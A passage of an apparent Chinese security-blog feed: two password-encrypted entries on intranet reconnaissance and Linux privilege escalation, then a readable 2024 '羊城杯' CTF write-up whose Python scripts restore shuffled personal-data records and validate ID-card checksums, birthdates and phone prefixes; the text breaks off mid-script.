69b7d93c25ff49b30ccfa5dfb1b5c9f7bd4117361583c86ed5d2e859f57d226a0abe59a4ac0de0370b1057c2aa36e26f5d1890626be96022d9c36bcef3376b1b565f59d6344266a7e5ce1815b530e318c4123849e48770813ce36b96e325e0c557cd10956f763e1ce6215ada6137b76896ee1ed87d6bb1e3f9c38a8db609fbbff48b372447d535e8496f1099c3ee93fdcb8829813b8677c10e45e86337158a52ddd2e8e2b1b36ccbe45a19bd74c9379f3cb42cf4f06c2cdf69bd87d92e9a8adebab098c4a6291511821638b92f0395df8aeb5c7312d246601b98a5839df377a1c6a0ce76f48ef61e3e1bac0af5fb6e43259a190e67bb5a01aafb726bfb16c85803daa5fb714a8d0941efba556f034d691cd4d138cb7dcce436d306872fadb1e654804283382ee18bc514283e406dd89597a4454c82f87d1a9bd2fc08fd2b69aac5feea3ebbcf28271fc12d91c8ecfb90a055a1ae823ca997d09a7422f6500a682141e4a94ecb772665211375a8bad26ceeeff44d4c9d0b9c1afb98ea80f302ab38b0d0bbd27e53a5a6b1f4c5f469acec773bc7ef932c48b00925fdfc78dc6f44adbdde87a3973ee387d65ae4c88efbada6dec38a14eebeadae49760f39aadab0f40141a7dab9ee6cc0e2018cfea141c7017787c288bad871e5e543854f8b89d66677261641e5ea12481980bc2bdde0ed1526bf674c005cceb932b6a485e855d43a8a959a54e50f65c4a28a1ee27dc48e899abf0f30c6a154930ea760f6f009f6996b94995b724e549b4465e1eab9b2bde7d9a45c29164780440b0b0c623604f18ab6799429c95857e4ac03778b5735baccea5158932584a1a19844df861255356dd9e166dfe7dac3c4c922a99a74500ec50e55fed2044da9174905ff535a8cf51ecc24124b802e8f5eab826bef6c7411700351e1e4b7d5c36ef9a6134bbd67ea51afd20699ea6f992bd12aaaed5c30906af2d596c5e7bbb08b708adeeca57f3756c987aa2ef127d55bc3b1eb79a902a38ace84e96a2f990443c34ed6fa7c545787fa34b62aa776233182d9521702a21e2c972a92247328a7a90c35c61c7c3eac0ddfa553d7773c4968eec61bb0b5ca1035794f0e9d2e13994e397e69dda558c6cf1ee6d51af90b34b69bb922fe558fd20929132f8e5e3a1d1babc80139aec783521b79af7d64454525f994d602915c9073cce18112ffca928da93badf3f04a424968d5ffc3010c5ab8a210550dccaba7a2045cd460fd299face0ada6b738f8cc2f384fc108274e263338a524c60782c9cc572cfaaa6585712215607998524b229ffbfbc018d463431a675ade6e0dc2a683db37d34731c1982ef0b0d7bf29fa20b55aea218a25dbcb6eb5d05f1dc6a6a8be70a3687d1874c8edbbeac9af3d3f8cbbb6fa95ea5ded5da446da9edb09adcec83ca983458591a1477e4127af20e6585b098f4ce744f7e7db84b1ebe969db0db82da24fa300cdccd794f0b7adcb66f6df58f58c1e2a027627b83f8e1458c43885d29d8a5f46335003cc5143adebf9866bd900545b15ac52c2a6f955e45671046f666279c1a862e8fe1a0dcb4bb2e435b5312d8e5491d09279aed609b166430f1a4c7ebccd5ca3741126d563</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="内网" scheme="https://www.dr0n.top/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="域" scheme="https://www.dr0n.top/tags/%E5%9F%9F/"/>
    
    <category term="信息收集" scheme="https://www.dr0n.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>linux提权笔记</title>
    <link href="https://www.dr0n.top/posts/fcb3a8d7/"/>
    <id>https://www.dr0n.top/posts/fcb3a8d7/</id>
    <published>2024-10-09T04:00:00.000Z</published>
    <updated>2024-10-12T12:58:21.569Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2261915eb2e47a30e7f7a5a816767e36e089f98bc002d4e8e99900c5bd893504">d53f41d2c7ee3b58c8999934d306edce26818fb1c2ebd9b89b87e60924dfef36552e0686e1961860047cf68e119d4096ebc8437b58eb4b4ffe813801a8ca5ec2484e6ea75a806c52c7da3dbcd5a439744503342761877e1795baa96a0639f0ad96a978328f98407e5b697c8f8fd7bea75632a63ca00b90b3f42d69e622eb7d6a1da71defabee1979e5a7431cafcfd6af0e2a8da8d5da15db62501e68cbd225066c5f037e89b4afd2200686770e2b13964e87757d68096cb6f0c5debbf1428fd32fe2c24732b5fc5021c4f7b13a907f57036673b0744132ba1f6dfc7ade6da017a69596720079b7fc2d9d41306f931783b83d95ecc55c65d73080c7e401db47feef11e5257e309373f116dea6906e2f00d1d5bc5723c8f23513b83f5c4eb4bbdcbbb24be1172bdc64c8564948734bdedd92c586402473539e4ef194de3d56a3cf6ab6cc9f0d9dd73c38fba568e665e5268d9d1707d222377fadb888842f439ed65d7316ce639c5d166f3a88f66f2b18060a4f3da0164afbc96092d998c1b3a2c2200d4f388885abed927593109b444fb05f0e38863167d954ecd82c62cab9e68ba73325c130ce11fc41c9d0b6f7df0fd833e01f332e20d15be2956ff9051b68c82d0531fe3faefc8f53b53ce2c7291654034ae80774b8a187e50c67515bd974aec9a152b38fa603aa1ca62b5ac9b52f08edf1bcce5aead12e63c4c0f22ec4298ab467531e0b5296a7e29262050de1703892a1ab2575b69c3273bcd7277535c21c2d31550e520b51f58be7424004e43ba19c7bdf2ce07b90855b66772788d5ec4da388063a319a25b5d1cf8435ea072bc78e2997ccae4b04f29425e092b78111c567c25e2e2709bcedcb6fae312cb7f2e5b027f22231f7d06aded1f3dfcf58369da9320e700e6e03b47f3741c0547471a7fc904852e660022e8556bca813e781ab628383e41a8a33e2cf4f0e6d90bb1a79a4cb58795b7946257ab7031c7321038082acf96b7c5e20815f1df1fa5d459432ff4a2bd90c6f60e8e9647c10c13497f7b0d4ef8ddb77ae14578baf8d17986ac09de0f4f079f521c5da738f50d55219d24ca7cc138a11ab44262ee7d421af265aa5d91ffe27740f933bddd9c2bba02539</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="linux" scheme="https://www.dr0n.top/tags/linux/"/>
    
    <category term="提权" scheme="https://www.dr0n.top/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="后渗透" scheme="https://www.dr0n.top/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>2024年“羊城杯”粤港澳大湾区网络安全大赛 wp</title>
    <link href="https://www.dr0n.top/posts/da856207/"/>
    <id>https://www.dr0n.top/posts/da856207/</id>
    <published>2024-08-28T01:00:00.000Z</published>
    <updated>2024-09-18T13:23:09.475Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初赛-数据安全"><a href="#初赛-数据安全" class="headerlink" title="[初赛] 数据安全"></a>[初赛] 数据安全</h1><h2 id="data-analy1"><a href="#data-analy1" class="headerlink" title="data-analy1"></a>data-analy1</h2><p>恢复被打乱的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br>data = pd.read_csv(<span class="hljs-string">&quot;person_data.csv&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>y = data.to_dict(orient=<span class="hljs-string">&#x27;records&#x27;</span>)<br><br><br>d = &#123;<span class="hljs-string">&#x27;编号&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;用户名&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;密码&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;姓名&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;性别&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;出生日期&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;身份证号&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;手机号码&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br><br><br>header = data.columns.values.tolist()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;person_data_new.csv&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f_csv = csv.writer(f)<br>    f_csv.writerow(header)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hanzi</span>(<span class="hljs-params">data</span>):<br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;[\u4e00-\u9fa5]&#123;2,&#125;&#x27;</span>)<br>    matches = pattern.findall(data)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(matches) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> y:<br>    <span class="hljs-keyword">for</span> _, value <span class="hljs-keyword">in</span> i.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) == <span class="hljs-number">18</span> <span class="hljs-keyword">and</span> value[<span class="hljs-number">0</span>:<span class="hljs-number">17</span>].isdigit():<br>            d[<span class="hljs-string">&#x27;身份证号&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(value) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> value.isdigit():<br>            d[<span class="hljs-string">&#x27;性别&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(value) == <span class="hljs-number">8</span> <span class="hljs-keyword">and</span> value.isdigit():<br>            d[<span class="hljs-string">&#x27;出生日期&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> re.search(<span class="hljs-string">r&#x27;[a-fA-F0-9]&#123;32&#125;&#x27;</span>, value)!=<span class="hljs-literal">None</span>:<br>            d[<span class="hljs-string">&#x27;密码&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> hanzi(value):<br>            d[<span class="hljs-string">&#x27;姓名&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(value) == <span class="hljs-number">11</span> <span class="hljs-keyword">and</span> value.isdigit():<br>            d[<span class="hljs-string">&#x27;手机号码&#x27;</span>] = value<br>        <span class="hljs-keyword">elif</span> value.isdigit():<br>            d[<span class="hljs-string">&#x27;编号&#x27;</span>] = value<br>        <span class="hljs-keyword">else</span>:<br>            d[<span class="hljs-string">&#x27;用户名&#x27;</span>] = value<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;person_data_new.csv&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f_csv = csv.writer(f)<br>        f_csv.writerow(d.values())<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-data-analy1.png"></p><h2 id="data-analy2"><a href="#data-analy2" class="headerlink" title="data-analy2"></a>data-analy2</h2><p>与上一题类似，筛选出不符合格式的数据</p><p>先从流量包中导出数据</p><p><code>tshark -r data.pcapng -T fields -e http.file_data -Y &quot;http.request&quot; &gt; data.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>)<br>e = [<span class="hljs-built_in">bytes</span>.fromhex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.read().splitlines()]<br>f.close()<br><br>d = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>    <span class="hljs-keyword">if</span> i.strip():<br>        d.append(i)<br>e = <span class="hljs-string">b&#x27;[&#x27;</span> + <span class="hljs-string">b&#x27;,&#x27;</span>.join(d) + <span class="hljs-string">b&#x27;]&#x27;</span><br><br>d = json.loads(e)<br><br><span class="hljs-comment"># l = &#123;&#x27;username&#x27;: &#x27;&#x27;, &#x27;name&#x27;: &#x27;&#x27;, &#x27;sex&#x27;: &#x27;&#x27;, &#x27;birth&#x27;: &#x27;&#x27;, &#x27;idcard&#x27;: &#x27;&#x27;, &#x27;phone&#x27;: &#x27;&#x27;&#125;</span><br><br><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&#x27;data.csv&#x27;</span>):<br>    os.remove(<span class="hljs-string">&#x27;data.csv&#x27;</span>)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.csv&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>)<br>f_csv = csv.writer(f)<br>f_csv.writerow(d[<span class="hljs-number">0</span>].keys())<br><br>phum = [<span class="hljs-number">734</span>, <span class="hljs-number">735</span>, <span class="hljs-number">736</span>, <span class="hljs-number">737</span>, <span class="hljs-number">738</span>, <span class="hljs-number">739</span>, <span class="hljs-number">747</span>, <span class="hljs-number">748</span>, <span class="hljs-number">750</span>, <span class="hljs-number">751</span>, <span class="hljs-number">752</span>, <span class="hljs-number">757</span>, <span class="hljs-number">758</span>, <span class="hljs-number">759</span>, <span class="hljs-number">772</span>, <span class="hljs-number">778</span>, <span class="hljs-number">782</span>, <span class="hljs-number">783</span>, <span class="hljs-number">784</span>, <span class="hljs-number">787</span>, <span class="hljs-number">788</span>, <span class="hljs-number">795</span>,<br>        <span class="hljs-number">798</span>, <span class="hljs-number">730</span>, <span class="hljs-number">731</span>, <span class="hljs-number">732</span>, <span class="hljs-number">740</span>, <span class="hljs-number">745</span>, <span class="hljs-number">746</span>, <span class="hljs-number">755</span>, <span class="hljs-number">756</span>, <span class="hljs-number">766</span>, <span class="hljs-number">767</span>, <span class="hljs-number">771</span>, <span class="hljs-number">775</span>, <span class="hljs-number">776</span>, <span class="hljs-number">785</span>, <span class="hljs-number">786</span>, <span class="hljs-number">796</span>, <span class="hljs-number">733</span>, <span class="hljs-number">749</span>, <span class="hljs-number">753</span>, <span class="hljs-number">773</span>, <span class="hljs-number">774</span>,<br>        <span class="hljs-number">777</span>, <span class="hljs-number">780</span>, <span class="hljs-number">781</span>, <span class="hljs-number">789</span>, <span class="hljs-number">790</span>, <span class="hljs-number">791</span>, <span class="hljs-number">793</span>, <span class="hljs-number">799</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># 将data前17位数字分别乘以不同的系数。从第⼀位到第⼗七位的系数分别是： 7, 9, 10 , 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2</span><br>    <span class="hljs-comment"># 将这17位数字和系数相乘的结果相加。</span><br>    <span class="hljs-comment"># 用加出来和除以11，得到余数</span><br>    <span class="hljs-comment"># 余数的结果对应的数字即为第18位数字。如果余数是2，那么第18位数字就是x</span><br><br>    data = data[:-<span class="hljs-number">1</span>]<br>    data = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, data))<br>    xi = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):<br>        <span class="hljs-built_in">sum</span> += xi[i] * <span class="hljs-built_in">int</span>(data[i])<br>    <span class="hljs-built_in">sum</span> %= <span class="hljs-number">11</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">0</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">1</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">2</span>:<br>        data.append(<span class="hljs-string">&#x27;X&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">12</span> - <span class="hljs-built_in">sum</span>))<br>    <span class="hljs-keyword">return</span> data[-<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> i.items():<br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;username&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> value.isalnum():<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;username: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;name&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">all</span>(<span class="hljs-string">&#x27;\u4e00&#x27;</span> &lt;= char &lt;= <span class="hljs-string">&#x27;\u9fa5&#x27;</span> <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> value):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;name: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;idcard&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) != <span class="hljs-number">18</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> value[:-<span class="hljs-number">1</span>].isdigit() <span class="hljs-keyword">or</span> value[-<span class="hljs-number">1</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789X&#x27;</span> <span class="hljs-keyword">or</span> value[-<span class="hljs-number">1</span>] != check(<br>                    value):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;idcard: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;sex&#x27;</span>:<br>            <span class="hljs-keyword">if</span> value <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;男&#x27;</span>, <span class="hljs-string">&#x27;女&#x27;</span>] <span class="hljs-keyword">or</span> (value == <span class="hljs-string">&#x27;男&#x27;</span> <span class="hljs-keyword">and</span> i[<span class="hljs-string">&#x27;idcard&#x27;</span>][<span class="hljs-number">16</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;13579&#x27;</span>) <span class="hljs-keyword">or</span> (<br>                    value == <span class="hljs-string">&#x27;女&#x27;</span> <span class="hljs-keyword">and</span> i[<span class="hljs-string">&#x27;idcard&#x27;</span>][<span class="hljs-number">16</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;02468&#x27;</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sex: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;birth&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) != <span class="hljs-number">8</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> value.isdigit() <span class="hljs-keyword">or</span> value != i[<span class="hljs-string">&#x27;idcard&#x27;</span>][<span class="hljs-number">6</span>:<span class="hljs-number">14</span>] <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(value[:<span class="hljs-number">4</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1900</span>,<br>                                                                                                                   <span class="hljs-number">2021</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(<br>                value[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">13</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(value[<span class="hljs-number">6</span>:]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;birth: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;phone&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) != <span class="hljs-number">11</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> value.isdigit() <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(value[:<span class="hljs-number">3</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> phum:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;phone: &quot;</span> + <span class="hljs-built_in">str</span>(i))<br>                f_csv.writerow(i.values())<br>                <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-data-analy2.png"></p><h2 id="data-analy3"><a href="#data-analy3" class="headerlink" title="data-analy3"></a>data-analy3</h2><p>给了三个日志文件，只有<code>error.log</code>有数据</p><p>部分校验与第二题类似，多了一个脱敏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 